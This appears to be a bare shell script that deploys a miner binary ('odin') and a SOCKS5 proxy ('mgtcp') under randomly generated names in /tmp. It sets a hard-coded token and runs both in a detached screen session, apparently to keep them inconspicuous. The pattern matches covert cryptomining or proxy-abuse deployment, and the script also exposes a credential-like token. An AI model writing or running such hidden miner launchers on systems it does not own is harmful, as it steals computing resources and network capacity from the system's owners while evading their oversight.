MYPORT=$1
mydir=dir$(shuf -i 10000000-99999999 -n 1)
myminer=min$(shuf -i 10000000-99999999 -n 1)
myprox=prox$(shuf -i 10000000-99999999 -n 1)
mybuild=build$(shuf -i 10000000-99999999 -n 1)
myscreen=alayar$(shuf -i 10000000-99999999 -n 1)
mkdir /tmp/$mydir
cp odin /tmp/$mydir/$myminer && chmod +x /tmp/$mydir/$myminer
cp mgtcp /tmp/$mydir/$myprox && chmod +x /tmp/$mydir/$myprox
cat >>$mybuild<<EOF
/tmp/$mydir/$myminer config set --token=bduagmfueitilkirfb0be3f6eb0f2276
/tmp/$mydir/$myprox --socks5=0.0.0.0:$MYPORT /tmp/$mydir/$myminer
EOF
mv $mybuild /tmp/$mydir/$mybuild
chmod +x /tmp/$mydir/$mybuild
screen -dmS $myscreen /tmp/$mydir/$mybuild
sleep 2 && screen -list
